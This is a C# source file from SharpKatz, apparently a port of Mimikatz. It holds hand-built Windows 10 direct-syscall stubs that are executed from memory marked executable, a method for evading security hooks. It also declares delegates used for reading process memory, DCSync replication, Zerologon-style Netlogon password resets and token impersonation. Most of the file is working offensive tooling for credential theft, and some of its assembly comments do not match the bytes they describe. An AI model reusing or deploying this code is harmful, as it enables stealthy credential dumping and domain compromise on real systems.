using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Win32
{
    class SysCall
    {
        const int memoryPtrotection = 0x40;

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x0f
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwClose10 = { 0x49, 0x89, 0xCA, 0xB8, 0x0F, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x3A
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwWriteVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x50
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwProtectVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x36
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwQuerySystemInformation10 = { 0x49, 0x89, 0xCA, 0xB8, 0x36, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  4c 8b d1                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x18
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtReadVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3f, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x3f
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtAllocateVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x1E
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtFreeVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x1E, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x55
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtCreateFile10 = { 0x49, 0x89, 0xCA, 0xB8, 0x55, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        ///0:  49 89 ca                mov r10,rcx
        ///3:  b8 26 00 00 00          mov eax,0x26
        ///8:  0f 05                   syscall
        ///a:  c3                      ret

        static byte[] bZwOpenProcess10 = { 0x49, 0x89, 0xCA, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
        {
            byte[] syscall = bZwOpenProcess10;

            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(memoryAddress,
                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));

            return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);

        }

        public static NTSTATUS ZwClose10(IntPtr handle)
        {
            byte[] syscall = bZwClose10;

            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(memoryAddress,
                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.ZwClose myAssemblyFunction = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwClose));

            return (NTSTATUS)myAssemblyFunction(handle);

        }

        public static NTSTATUS ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength)
        {
            byte[] syscall = bZwQuerySystemInformation10;

            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(memoryAddress,
                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.ZwQuerySystemInformation myAssemblyFunction = (Delegates.ZwQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwQuerySystemInformation));

            return (NTSTATUS)myAssemblyFunction(SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength);

        }

        public static NTSTATUS NtReadVirtualMemory10(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead)
        {
            byte[] syscall = bNtReadVirtualMemory10;

            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(memoryAddress,
                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.NtReadVirtualMemory myAssemblyFunction = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtReadVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);

        }

        public static NTSTATUS NtWriteVirtualMemory10(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
        {
            byte[] syscall = bZwWriteVirtualMemory10;

            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(memoryAddress,
                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);

        }

        public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
        {
            byte[] syscall = bNtAllocateVirtualMemory10;

            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(memoryAddress,
                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);

        }

        public static NTSTATUS NtFreeVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType)
        {
            byte[] syscall = bNtFreeVirtualMemory10;

            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(memoryAddress,
                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
            {
                throw new Win32Exception();
            }


            Delegates.NtFreeVirtualMemory myAssemblyFunction = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtFreeVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ref RegionSize, FreeType);

        }

        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwClose(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlEqualUnicodeString(UNICODE_STRING String1, UNICODE_STRING String2, bool CaseInSensitive);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlGetNtVersionNumbers(out UInt32 major, out UInt32 minor, out UInt32 build);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlInitString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPStr)] string SourceString);
            
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Natives.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetCurrentProcess();

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CloseHandle(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool LookupPrivilegeValue(string lpSystemName, String lpName, ref LUID luid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool LookupAccountNameA( string lpSystemName, string lpAccountName, byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ConvertSidToStringSid(byte[] pSID, out string ptrSid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ConvertStringSidToSid(string stringsid, out IntPtr ptrSid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcBindingFromStringBinding(string bindingString, out IntPtr lpBinding);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int I_RpcBindingInqSecurityContext(IntPtr Binding, out IntPtr SecurityContextHandle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_1(IntPtr pMIDL_STUB_DESC, IntPtr formatString, ref IntPtr hDrs);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_2(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hBinding, Guid NtdsDsaObjectGuid, DRS_EXTENSIONS_INT ext_int, ref IntPtr pDrsExtensionsExt, ref IntPtr hDrs);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_3(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_DCINFOREQ_V1 dcInfoReq, ref uint dcOutVersion, ref DRS_MSG_DCINFOREPLY_V2 dcInfoRep);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_4(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_CRACKREQ_V1 dcInfoReq, ref uint dcOutVersion, ref IntPtr dcInfoRep);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_5(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dwInVersion, DRS_MSG_GETCHGREQ_V8 pmsgIn, ref uint dwOutVersion, ref DRS_MSG_GETCHGREPLY_V6 pmsgOut);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcBindingFree(ref IntPtr lpString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcBindingSetAuthInfoEx(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr identity, UInt32 AuthzSvc, ref RPC_SECURITY_QOS SecurityQOS);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RpcEpResolveBinding(IntPtr Binding, IntPtr IfSpec);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RtlDecryptDES2blocks1DWORD(byte[] data, ref UInt32 key, IntPtr output);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetSidSubAuthorityCount(IntPtr psid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RtlEncryptDecryptRC4(ref CRYPTO_BUFFER data, ref CRYPTO_BUFFER key);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int QueryContextAttributes(IntPtr hContext, uint ulAttribute, ref SecPkgContext_SessionKey pContextAttributes);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int flags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            internal delegate int BCryptDestroyKey(IntPtr hKey);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int BCryptOpenAlgorithmProvider(out SafeBCryptAlgorithmHandle phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int BCryptSetProperty(SafeHandle hProvider, string pszProperty, string pbInput, int cbInput, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int BCryptGenerateSymmetricKey(SafeBCryptAlgorithmHandle hAlgorithm, out SafeBCryptKeyHandle phKey, IntPtr pbKeyObject, int cbKeyObject, IntPtr pbSecret, int cbSecret, int flags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int BCryptDecrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int BCryptEncrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr ASN1_CreateModule(uint nVersion, uint eRule, uint dwFlags, uint cPDU, IntPtr[] apfnEncoder, IntPtr[] apfnDecoder, IntPtr[] apfnFreeMemory, int[] acbStructSize, uint nModuleName);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate ASN1error_e ASN1_CreateEncoder(IntPtr pModule, out IntPtr ppEncoderInfo, IntPtr pbBuf, uint cbBufSize, IntPtr pParent);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate ASN1error_e ASN1_CreateDecoder(IntPtr pModule, out IntPtr ppDecoderInfo, IntPtr pbBuf, uint cbBufSize, IntPtr pParent);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ASN1BERDotVal2Eoid(IntPtr pEncoderInfo, string dotOID, IntPtr encodedOID);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_FreeEncoded(ref ASN1encoding_s pEncoderInfo, IntPtr pBuf);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_CloseEncoder(IntPtr pEncoderInfo);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_CloseDecoder(IntPtr pDecoderInfo);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_CloseModule(IntPtr pModule);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool CreateProcessWithLogonW(string userName, string domain, string password, LogonFlags dwLogonFlags, string applicationName, string commandLine, CreationFlags dwCreationFlags, uint environment, string currentDirectory, ref STARTUPINFO startupInfo, out PROCESS_INFORMATION processInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, int ImpersonationLevel, int TokenType, ref IntPtr phNewToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void NtResumeProcess(IntPtr hProcess);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtTerminateProcess(IntPtr hProcess, uint uExitCode);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate uint NetrServerReqChallenge(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate uint NetrServerAuthenticate3(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE SecoureChannelType, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge, out uint NegotiateFlags, out uint AccountRid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate uint NetServerPasswordSet2(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, IntPtr ComputerName, IntPtr Authenticator, IntPtr ReturnAuthenticator, IntPtr ClearNewPassword);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool LogonUser(string pszUserName, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ImpersonateLoggedOnUser(IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RevertToSelf();
        }
    }
}
